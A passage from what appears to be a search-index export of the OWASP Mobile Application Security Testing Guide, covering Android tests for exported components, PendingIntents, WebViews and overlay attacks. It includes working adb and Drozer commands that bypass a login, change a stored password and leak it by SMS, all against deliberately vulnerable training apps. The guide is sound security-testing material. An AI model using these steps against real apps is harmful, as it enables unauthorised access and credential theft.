android:exported(0x01010010)=(type 0x12)0xffffffff\n  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff\n  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff\n  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff\nE: activity (line=60)\n  A: android:label(0x01010001)=@0x7f05000a\n  A: android:name(0x01010003)=\".SettingsActivity\" (Raw: \".SettingsActivity\")\n  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff\n  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff\n  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff\n...\n</code></pre> <p>You can identify an exported activity using one of the following properties:</p> <ul> <li>It have an <code>intent-filter</code> sub declaration.</li> <li>It have the attribute <code>android:exported</code> to <code>0xffffffff</code>.</li> </ul> <p>You can also use  jadx to identify exported activities in the file <code>AndroidManifest.xml</code> using the criteria described above:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.mwr.example.sieve\"&gt;\n...\n  &lt;!-- This activity is exported via the attribute \"exported\" --&gt;\n  &lt;activity android:name=\".FileSelectActivity\" android:exported=\"true\" /&gt;\n   &lt;!-- This activity is exported via the \"intent-filter\" declaration  --&gt;\n  &lt;activity android:name=\".MainLoginActivity\"&gt;\n    &lt;intent-filter&gt;\n      &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n      &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n    &lt;/intent-filter&gt;\n  &lt;/activity&gt;\n  &lt;!-- This activity is exported via the attribute \"exported\" --&gt;\n  &lt;activity android:name=\".PWList\" android:exported=\"true\" /&gt;\n  &lt;!-- Activities below are not exported --&gt;\n  &lt;activity android:name=\".SettingsActivity\" /&gt;\n  &lt;activity android:name=\".AddEntryActivity\"/&gt;\n  &lt;activity android:name=\".ShortLoginActivity\" /&gt;\n  &lt;activity android:name=\".WelcomeActivity\" /&gt;\n  &lt;activity android:name=\".PINActivity\" /&gt;\n...\n&lt;/manifest&gt;\n</code></pre> <p>Enumerating activities in the vulnerable password manager \"Sieve\" shows that the following activities are exported:</p> <ul> <li><code>.MainLoginActivity</code></li> <li><code>.PWList</code></li> <li><code>.FileSelectActivity</code></li> </ul> <p>Use the command below to launch an activity:</p> <pre><code># Start the activity without specifying an action or an category\n$ adb shell am start -n com.mwr.example.sieve/.PWList\nStarting: Intent { cmp=com.mwr.example.sieve/.PWList }\n\n# Start the activity indicating an action (-a) and an category (-c)\n$ adb shell am start -n \"com.mwr.example.sieve/.MainLoginActivity\" -a android.intent.action.MAIN -c android.intent.category.LAUNCHER\nStarting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.mwr.example.sieve/.MainLoginActivity }\n</code></pre> <p>Since the activity <code>.PWList</code> is called directly in this example, you can use it to bypass the login form protecting the password manager, and access the data contained within the password manager.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#services_1","title":"Services","text":"<p>Services can be enumerated with the Drozer module <code>app.service.info</code>:</p> <pre><code>dz&gt; run app.service.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\n  com.mwr.example.sieve.AuthService\n    Permission: null\n  com.mwr.example.sieve.CryptoService\n    Permission: null\n</code></pre> <p>To communicate with a service, you must first use static analysis to identify the required inputs.</p> <p>Because this service is exported, you can use the module <code>app.service.send</code> to communicate with the service and change the password stored in the target application:</p> <pre><code>dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD \"abcdabcdabcdabcd\" --bundle-as-obj\nGot a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:\n  what: 4\n  arg1: 42\n  arg2: 0\n  Empty\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#broadcast-receivers_1","title":"Broadcast Receivers","text":"<p>To list broadcast receivers exported by an application, you can use the following command and focus on <code>receiver</code> elements:</p> <pre><code>$ aapt d xmltree InsecureBankv2.apk AndroidManifest.xml\n...\nE: receiver (line=88)\n  A: android:name(0x01010003)=\"com.android.insecurebankv2.MyBroadCastReceiver\" (Raw: \"com.android.insecurebankv2.MyBroadCastReceiver\")\n  A: android:exported(0x01010010)=(type 0x12)0xffffffff\n  E: intent-filter (line=91)\n    E: action (line=92)\n      A: android:name(0x01010003)=\"theBroadcast\" (Raw: \"theBroadcast\")\nE: receiver (line=119)\n  A: android:name(0x01010003)=\"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\" (Raw: \"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\")\n  A: android:exported(0x01010010)=(type 0x12)0x0\n  E: intent-filter (line=122)\n    E: action (line=123)\n      A: android:name(0x01010003)=\"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\" (Raw: \"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\")\n...\n</code></pre> <p>You can identify an exported broadcast receiver using one of the following properties:</p> <ul> <li>It has an <code>intent-filter</code> sub declaration.</li> <li>It has the attribute <code>android:exported</code> set to <code>0xffffffff</code>.</li> </ul> <p>You can also use  jadx to identify exported broadcast receivers in the file <code>AndroidManifest.xml</code> using the criteria described above:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.android.insecurebankv2\"&gt;\n...\n  &lt;!-- This broadcast receiver is exported via the attribute \"exported\" as well as the \"intent-filter\" declaration --&gt;\n  &lt;receiver android:name=\"com.android.insecurebankv2.MyBroadCastReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n      &lt;action android:name=\"theBroadcast\"/&gt;\n    &lt;/intent-filter&gt;\n  &lt;/receiver&gt;\n  &lt;!-- This broadcast receiver is NOT exported because the attribute \"exported\" is explicitly set to false --&gt;\n  &lt;receiver android:name=\"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\" android:exported=\"false\"&gt;\n    &lt;intent-filter&gt;\n      &lt;action android:name=\"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\"/&gt;\n    &lt;/intent-filter&gt;\n  &lt;/receiver&gt;\n...\n&lt;/manifest&gt;\n</code></pre> <p>The above example from the vulnerable banking application  InsecureBankv2 shows that only the broadcast receiver named <code>com.android.insecurebankv2.MyBroadCastReceiver</code> is exported.</p> <p>Now that you know that there is an exported broadcast receiver, you can dive deeper and reverse engineer the app using  jadx. This will allow you to analyze the source code searching for potential vulnerabilities that you could later try to exploit. The source code of the exported broadcast receiver is the following:</p> <pre><code>package com.android.insecurebankv2;\n...\npublic class MyBroadCastReceiver extends BroadcastReceiver {\n    public static final String MYPREFS = \"mySharedPreferences\";\n    String usernameBase64ByteString;\n\n    public void onReceive(Context context, Intent intent) {\n        String phn = intent.getStringExtra(\"phonenumber\");\n        String newpass = intent.getStringExtra(\"newpass\");\n        if (phn != null) {\n            try {\n                SharedPreferences settings = context.getSharedPreferences(\"mySharedPreferences\", 1);\n                this.usernameBase64ByteString = new String(Base64.decode(settings.getString(\"EncryptedUsername\", (String) null), 0), \"UTF-8\");\n                String decryptedPassword = new CryptoClass().aesDeccryptedString(settings.getString(\"superSecurePassword\", (String) null));\n                String textPhoneno = phn.toString();\n                String textMessage = \"Updated Password from: \" + decryptedPassword + \" to: \" + newpass;\n                SmsManager smsManager = SmsManager.getDefault();\n                System.out.println(\"For the changepassword - phonenumber: \" + textPhoneno + \" password is: \" + textMessage);\n                smsManager.sendTextMessage(textPhoneno, (String) null, textMessage, (PendingIntent) null, (PendingIntent) null);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Phone number is null\");\n        }\n    }\n}\n</code></pre> <p>As you can see in the source code, this broadcast receiver expects two parameters named <code>phonenumber</code> and <code>newpass</code>. With this information you can now try to exploit this broadcast receiver by sending events to it using custom values:</p> <pre><code># Send an event with the following properties:\n# Action is set to \"theBroadcast\"\n# Parameter \"phonenumber\" is set to the string \"07123456789\"\n# Parameter \"newpass\" is set to the string \"12345\"\n$ adb shell am broadcast -a theBroadcast --es phonenumber \"07123456789\" --es newpass \"12345\"\nBroadcasting: Intent { act=theBroadcast flg=0x400000 (has extras) }\nBroadcast completed: result=0\n</code></pre> <p>This generates the following SMS:</p> <pre><code>Updated Password from: SecretPassword@ to: 12345\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#sniffing-intents","title":"Sniffing Intents","text":"<p>If an Android application broadcasts intents without setting a required permission or specifying the destination package, the intents can be monitored by any application that runs on the device.</p> <p>To register a broadcast receiver to sniff intents, use the Drozer module <code>app.broadcast.sniff</code> and specify the action to monitor with the <code>--action</code> parameter:</p> <pre><code>dz&gt; run app.broadcast.sniff  --action theBroadcast\n[*] Broadcast receiver registered to sniff matching intents\n[*] Output is updated once a second. Press Control+C to exit.\n\nAction: theBroadcast\nRaw: Intent { act=theBroadcast flg=0x10 (has extras) }\nExtra: phonenumber=07123456789 (java.lang.String)\nExtra: newpass=12345 (java.lang.String)`\n</code></pre> <p>You can also use the following command to sniff the intents. However, the content of the extras passed will not be displayed:</p> <pre><code>$ adb shell dumpsys activity broadcasts | grep \"theBroadcast\"\nBroadcastRecord{fc2f46f u0 theBroadcast} to user 0\nIntent { act=theBroadcast flg=0x400010 (has extras) }\nBroadcastRecord{7d4f24d u0 theBroadcast} to user 0\nIntent { act=theBroadcast flg=0x400010 (has extras) }\n45: act=theBroadcast flg=0x400010 (has extras)\n46: act=theBroadcast flg=0x400010 (has extras)\n121: act=theBroadcast flg=0x400010 (has extras)\n144: act=theBroadcast flg=0x400010 (has extras)\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0030/","title":"MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0030/#overview","title":"Overview","text":"<p>When testing Pending Intents you must ensure that they are immutable and that the app explicitly specifies the exact package, action, and component that will receive the base intent.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0030/#static-analysis","title":"Static Analysis","text":"<p>To identify vulnerable implementations, static analysis can be performed by looking for API calls used for obtaining a <code>PendingIntent</code>. Such APIs are listed below:</p> <pre><code>PendingIntent getActivity(Context, int, Intent, int)\nPendingIntent getActivity(Context, int, Intent, int, Bundle)\nPendingIntent getActivities(Context, int, Intent, int, Bundle)\nPendingIntent getActivities(Context, int, Intent, int)\nPendingIntent getForegroundService(Context, int, Intent, int)\nPendingIntent getService(Context, int, Intent, int)\n</code></pre> <p>Once any of the above function is spotted, check the implementation of the base intent and the <code>PendingIntent</code> for the security pitfalls listed in the Pending Intents section.</p> <p>For example, in A-156959408(CVE-2020-0389), the base intent is implicit and also the <code>PendingIntent</code> is mutable, thus making it exploitable.</p> <pre><code>private Notification createSaveNotification(Uri uri) {\n    Intent viewIntent = new Intent(Intent.ACTION_VIEW)\n            .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION)\n            .setDataAndType(uri, \"video/mp4\"); //Implicit Intent\n\n//... skip ...\n\n\nNotification.Builder builder = new Notification.Builder(this, CHANNEL_ID)\n                .setSmallIcon(R.drawable.ic_android)\n                .setContentTitle(getResources().getString(R.string.screenrecord_name))\n                .setContentText(getResources().getString(R.string.screenrecord_save_message))\n                .setContentIntent(PendingIntent.getActivity(\n                        this,\n                        REQUEST_CODE,\n                        viewIntent,\n                        Intent.FLAG_GRANT_READ_URI_PERMISSION))     // Mutable PendingIntent.\n                .addAction(shareAction)\n                .addAction(deleteAction)\n                .setAutoCancel(true);\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0030/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Frida can be used to hook the APIs used to get a <code>PendingIntent</code>. This information can be used to determine the code location of the call, which can be further used to perform static analysis as described above.</p> <p>Here's an example of such a Frida script that can be used to hook the <code>PendingIntent.getActivity</code> function:</p> <pre><code>var pendingIntent = Java.use('android.app.PendingIntent');\n\nvar getActivity_1 = pendingIntent.getActivity.overload(\"android.content.Context\", \"int\", \"android.content.Intent\", \"int\");\n\ngetActivity_1.implementation = function(context, requestCode, intent, flags){\n    console.log(\"[*] Calling PendingIntent.getActivity(\"+intent.getAction()+\")\");\n    console.log(\"\\t[-] Base Intent toString: \" + intent.toString());\n    console.log(\"\\t[-] Base Intent getExtras: \" + intent.getExtras());\n    console.log(\"\\t[-] Base Intent getFlags: \" + intent.getFlags());\n    return this.getActivity(context, requestCode, intent, flags);\n}\n</code></pre> <p>This approach can be helpful when dealing with applications with large code bases, where determining the control flow can sometimes be tricky.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0031/","title":"MASTG-TEST-0031: Testing JavaScript Execution in WebViews","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: Having JavaScript enabled is not considered a vulnerability by itself, but it can lead to security issues in combination with other weaknesses, such as local file access in WebViews, which are covered by other tests in the MASTG v2. This test is therefore not considered a standalone test anymore.</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <p>No tests are covering this weakness.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0031/#overview","title":"Overview","text":"<p>To test for JavaScript execution in WebViews check the app for WebView usage and evaluate whether or not each WebView should allow JavaScript execution. If JavaScript execution is required for the app to function normally, then you need to ensure that the app follows the all best practices.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0031/#static-analysis","title":"Static Analysis","text":"<p>To create and use a WebView, an app must create an instance of the <code>WebView</code> class.</p> <pre><code>WebView webview = new WebView(this);\nsetContentView(webview);\nwebview.loadUrl(\"https://www.owasp.org/\");\n</code></pre> <p>Various settings can be applied to the WebView (activating/deactivating JavaScript is one example). JavaScript is disabled by default for WebViews and must be explicitly enabled. Look for the method <code>setJavaScriptEnabled</code> to check for JavaScript activation.</p> <pre><code>webview.getSettings().setJavaScriptEnabled(true);\n</code></pre> <p>This allows the WebView to interpret JavaScript. It should be enabled only if necessary to reduce the attack surface to the app. If JavaScript is necessary, you should make sure that</p> <ul> <li>The communication to the endpoints consistently relies on HTTPS (or other protocols that allow encryption) to protect HTML and JavaScript from tampering during transmission.</li> <li>JavaScript and HTML are loaded locally, from within the app data directory or from trusted web servers only.</li> <li>The user cannot define which sources to load by means of loading different resources based on a user provided input.</li> </ul> <p>To remove all JavaScript source code and locally stored data, clear the WebView's cache with <code>clearCache</code> when the app closes.</p> <p>Devices running platforms older than Android 4.4 (API level 19) use a version of WebKit that has several security issues. As a workaround, the app must confirm that WebView objects display only trusted content if the app runs on these devices.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0031/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Dynamic Analysis depends on operating conditions. There are several ways to inject JavaScript into an app's WebView:</p> <ul> <li>Stored Cross-Site Scripting vulnerabilities in an endpoint; the exploit will be sent to the mobile app's WebView when the user navigates to the vulnerable function.</li> <li>Attacker takes a Machine-in-the-Middle (MITM) position and tampers with the response by injecting JavaScript.</li> <li>Malware tampering with local files that are loaded by the WebView.</li> </ul> <p>To address these attack vectors, check the following:</p> <ul> <li>All functions offered by the endpoint should be free of stored XSS.</li> <li> <p>Only files that are in the app data directory should be rendered in a WebView (see test case \"Testing for Local File Inclusion in WebViews\").</p> </li> <li> <p>The HTTPS communication must be implemented according to best practices to avoid MITM attacks. This means:</p> <ul> <li>all communication is encrypted via TLS,</li> <li>the certificate is checked properly, and/or</li> <li>the certificate should be pinned.</li> </ul> </li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0032/","title":"MASTG-TEST-0032: Testing WebView Protocol Handlers","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> References to Content Provider Access in WebViews</li> <li> Runtime Use of Content Provider Access APIs in WebViews</li> <li> References to Local File Access in WebViews</li> <li> Runtime Use of Local File Access APIs in WebViews</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0032/#overview","title":"Overview","text":"<p>To test for WebView protocol handlers (or resource access) check the app for WebView usage and evaluate whether or not the WebView should have resource access. If resource access is necessary you need to verify that it's implemented following best practices.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0032/#static-analysis","title":"Static Analysis","text":"<p>Check the source code for WebView usage. The following WebView settings control resource access:</p> <ul> <li><code>setAllowContentAccess</code>: Content URL access allows WebViews to load content from a content provider installed on the system, which is enabled by default .</li> <li><code>setAllowFileAccess</code>: Enables and disables file access within a WebView. The default value is <code>true</code> when targeting Android 10 (API level 29) and below and <code>false</code> for Android 11 (API level 30) and above. Note that this enables and disables file system access only. Asset and resource access is unaffected and accessible via <code>file:///android_asset</code> and <code>file:///android_res</code>.</li> <li><code>setAllowFileAccessFromFileURLs</code>: Does or does not allow JavaScript running in the context of a file scheme URL to access content from other file scheme URLs. The default value is <code>true</code> for Android 4.0.3 - 4.0.4 (API level 15) and below and <code>false</code> for Android 4.1 (API level 16) and above.</li> <li><code>setAllowUniversalAccessFromFileURLs</code>: Does or does not allow JavaScript running in the context of a file scheme URL to access content from any origin. The default value is <code>true</code> for Android 4.0.3 - 4.0.4 (API level 15) and below and <code>false</code> for Android 4.1 (API level 16) and above.</li> </ul> <p>If one or more of the above methods is/are activated, you should determine whether the method(s) is/are really necessary for the app to work properly.</p> <p>If a WebView instance can be identified, find out whether local files are loaded with the <code>loadURL</code> method.</p> <pre><code>WebView = new WebView(this);\nwebView.loadUrl(\"file:///android_asset/filename.html\");\n</code></pre> <p>The location from which the HTML file is loaded must be verified. If the file is loaded from external storage, for example, the file is readable and writable by everyone. This is considered a bad practice. Instead, the file should be placed in the app's assets directory.</p> <pre><code>webview.loadUrl(\"file:///\" +\nEnvironment.getExternalStorageDirectory().getPath() +\n\"filename.html\");\n</code></pre> <p>The URL specified in <code>loadURL</code> should be checked for dynamic parameters that can be manipulated; their manipulation may lead to local file inclusion.</p> <p>Use the following code snippet and best practices to deactivate protocol handlers, if applicable:</p> <pre><code>//If attackers can inject script into a WebView, they could access local resources. This can be prevented by disabling local file system access, which is enabled by default. You can use the Android WebSettings class to disable local file system access via the public method `setAllowFileAccess`.\nwebView.getSettings().setAllowFileAccess(false);\n\nwebView.getSettings().setAllowFileAccessFromFileURLs(false);\n\nwebView.getSettings().setAllowUniversalAccessFromFileURLs(false);\n\nwebView.getSettings().setAllowContentAccess(false);\n</code></pre> <ul> <li>Create a list that defines local and remote web pages and protocols that are allowed to be loaded.</li> <li>Create checksums of the local HTML/JavaScript files and check them while the app is starting up. Minify JavaScript files to make them harder to read.</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0032/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>To identify the usage of protocol handlers, look for ways to trigger phone calls and ways to access files from the file system while you're using the app.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0033/","title":"MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0033/#overview","title":"Overview","text":"<p>To test for Java objects exposed through WebViews check the app for WebViews having JavaScript enabled and determine whether the WebView is creating any JavaScript interfaces aka. \"JavaScript Bridges\". Finally, check whether an attacker could potentially inject malicious JavaScript code.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0033/#static-analysis","title":"Static Analysis","text":"<p>The following example shows how <code>addJavascriptInterface</code> is used to bridge a Java Object and JavaScript in a WebView:</p> <pre><code>WebView webview = new WebView(this);\nWebSettings webSettings = webview.getSettings();\nwebSettings.setJavaScriptEnabled(true);\n\nMSTG_ENV_008_JS_Interface jsInterface = new MSTG_ENV_008_JS_Interface(this);\n\nmyWebView.addJavascriptInterface(jsInterface, \"Android\");\nmyWebView.loadURL(\"http://example.com/file.html\");\nsetContentView(myWebView);\n</code></pre> <p>In Android 4.2 (API level 17) and above, an annotation <code>@JavascriptInterface</code> explicitly allows JavaScript to access a Java method.</p> <pre><code>public class MSTG_ENV_008_JS_Interface {\n\n        Context mContext;\n\n        /** Instantiate the interface and set the context */\n        MSTG_ENV_005_JS_Interface(Context c) {\n            mContext = c;\n        }\n\n        @JavascriptInterface\n        public String returnString () {\n            return \"Secret String\";\n        }\n\n        /** Show a toast from the web page */\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();\n        }\n}\n</code></pre> <p>This is how you can call the method <code>returnString</code> from JavaScript, the string \"Secret String\" will be stored in the variable <code>result</code>:</p> <pre><code>var result = window.Android.returnString();\n</code></pre> <p>With access to the JavaScript code, via, for example, stored XSS or a MITM attack, an attacker can directly call the exposed Java methods.</p> <p>If <code>addJavascriptInterface</code> is necessary, take the following considerations:</p> <ul> <li>Only JavaScript provided with the APK should be allowed to use the bridges, e.g. by verifying the URL on each bridged Java method (via <code>WebView.getUrl</code>).</li> <li>No JavaScript should be loaded from remote endpoints, e.g. by keeping page navigation within the app's domains and opening all other domains on the default browser (e.g. Chrome, Firefox).</li> <li>If necessary for legacy reasons (e.g. having to support older devices), at least set the minimal API level to 17 in the manifest file of the app (<code>&lt;uses-sdk android:minSdkVersion=\"17\" /&gt;</code>).</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0033/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Dynamic analysis of the app can show you which HTML or JavaScript files are loaded and which vulnerabilities are present. The procedure for exploiting the vulnerability starts with producing a JavaScript payload and injecting it into the file that the app is requesting. The injection can be accomplished via a MITM attack or direct modification of the file if it is stored in external storage. The whole process can be accomplished via Drozer and weasel (MWR's advanced exploitation payload), which can install a full agent, injecting a limited agent into a running process or connecting a reverse shell as a Remote Access Tool (RAT).</p> <p>A full description of the attack is included in the blog article \"WebView addJavascriptInterface Remote Code Execution\".</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0035/","title":"MASTG-TEST-0035: Testing for Overlay Attacks","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0035: Testing for Overlay Attacks (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-PLATFORM-9","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0035/#overview","title":"Overview","text":"<p>To test for overlay attacks you need to check the app for usage of certain APIs and attributed typically used to protect against overlay attacks as well as check the Android version that app is targeting.</p> <p>To mitigate these attacks please carefully read the general guidelines about Android View security in the Android Developer Documentation. For instance, the so-called touch filtering is a common defense against tapjacking, which contributes to safeguarding users against these vulnerabilities, usually in combination with other techniques and considerations as we introduce in this section.</p>","tags":["android","L2","test","MSTG-PLATFORM-9","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0035/#static-analysis","title":"Static Analysis","text":"<p>To start your static analysis you can check the app for the following methods and attributes (non-exhaustive list):</p> <ul> <li>Override <code>onFilterTouchEventForSecurity</code> for more fine-grained control and to implement a custom security policy for views.</li> <li>Set the layout attribute <code>android:filterTouchesWhenObscured</code> to true or call <code>setFilterTouchesWhenObscured</code>.</li> <li>Check FLAG_WINDOW_IS_OBSCURED (since API level 9) or FLAG_WINDOW_IS_PARTIALLY_OBSCURED (starting on API level 29).</li> </ul> <p>Some attributes might affect the app as a whole, while others can be applied to specific components. The latter would be the case when, for example, there is a business need to specifically allow overlays while wanting to protect sensitive input UI elements. The developers might also take additional precautions to confirm the user's actual intent which might be legitimate and tell it apart from a potential attack.</p> <p>As a final note, always remember to properly check the API level that app is targeting and the implications that this has. For instance, Android 8.0 (API level 26) introduced changes to apps requiring <code>SYSTEM_ALERT_WINDOW</code> (\"draw on top\"). From this API level on, apps using <code>TYPE_APPLICATION_OVERLAY</code> will be always shown above other windows having other types such as <code>TYPE_SYSTEM_OVERLAY</code> or <code>TYPE_SYSTEM_ALERT</code>. You can use this information to ensure that no overlay attacks may occur at least for this app in this concrete Android version.</p>","tags":["android","L2","test","MSTG-PLATFORM-9","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0035/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Abusing this kind of vulnerability on a dynamic manner can be pretty challenging and very specialized as it closely depends on the target Android version. For instance, for versions up to Android 7.0 (API level 24) you can use the following APKs as a proof of concept to identify the existence of the vulnerabilities.</p> <ul> <li>Tapjacking POC: This APK creates a simple overlay which sits on top of the testing application.</li> <li>Invisible Keyboard: This APK creates multiple overlays on the keyboard to capture keystrokes. This is one of the exploit demonstrated in Cloak and Dagger attacks.</li> </ul>","tags":["android","L2","test","MSTG-PLATFORM-9","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0037/","title":"MASTG-TEST-0037: Testing WebViews Cleanup","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0037: Testing WebViews Cleanup (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-PLATFORM-10","masvs-platform-2"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0037/#overview","title":"Overview","text":"<p>To test for WebViews cleanup you should inspect all APIs related to WebView data deletion and try to fully track the data deletion process.</p>","tags":["android","L2","test","MSTG-PLATFORM-10","masvs-platform-2"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0037/#static-analysis","title":"Static Analysis","text":"<p>Start by identifying the usage of the following WebView APIs and carefully validate the mentioned best practices.</p> <ul> <li> <p>Initialization: an app might be initializing the WebView in a way to avoid storing certain information by using <code>setDomStorageEnabled</code>, <code>setAppCacheEnabled</code> or <code>setDatabaseEnabled</code> from <code>android.webkit.WebSettings</code>. The DOM Storage (for using the HTML5 local storage), Application Caches and Database Storage APIs are disabled by default, but apps might set these settings explicitly to \"true\".</p> </li> <li> <p>Cache: Android's WebView class offers the <code>clearCache</code> method which can be used to clear the cache for all WebViews used by the app. It receives a boolean input parameter (<code>includeDiskFiles</code>) which will wipe all stored resource including the RAM cache. However if it's set to false, it will only clear the RAM cache. Check the app for usage of the <code>clearCache</code> method and verify its input parameter. Additionally, you may also check if the app is overriding <code>onRenderProcessUnresponsive</code> for the case when the WebView might become unresponsive, as the <code>clearCache</code> method might also be called from there.</p> </li> <li> <p>WebStorage APIs: <code>WebStorage.deleteAllData</code> can be also used to clear all storage currently being used by the JavaScript storage APIs, including the Web SQL Database and the HTML5 Web Storage APIs.</p> <p>Some apps will need to enable the DOM storage in order to display some HTML5 sites that use local storage. This should be carefully investigated as this might contain sensitive data.</p> </li> <li> <p>Cookies: any existing cookies can be deleted by using CookieManager.removeAllCookies.</p> </li> <li> <p>File APIs: proper data deletion in certain directories might not be that 